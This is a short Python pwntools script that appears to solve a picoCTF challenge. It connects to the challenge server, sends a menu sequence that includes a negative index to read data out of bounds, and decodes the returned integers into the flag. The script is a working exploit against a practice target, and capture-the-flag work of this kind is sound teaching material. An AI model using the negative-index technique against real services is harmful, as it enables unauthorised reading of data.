from pwn import *

p = remote("mercury.picoctf.net", 24851)

p.recv()
p.sendline("0")
p.recv()
p.sendline("-6")

p.recv()
p.sendline("2")
p.recv()
p.sendline("1")

p.recvuntil("[")

flags_i = p.recvuntil("]", drop=True).decode("utf-8")
flags_i = flags_i.split(" ")

flags = ""

for flag in flags_i:
    flags += chr(int(flag))

print(flags)
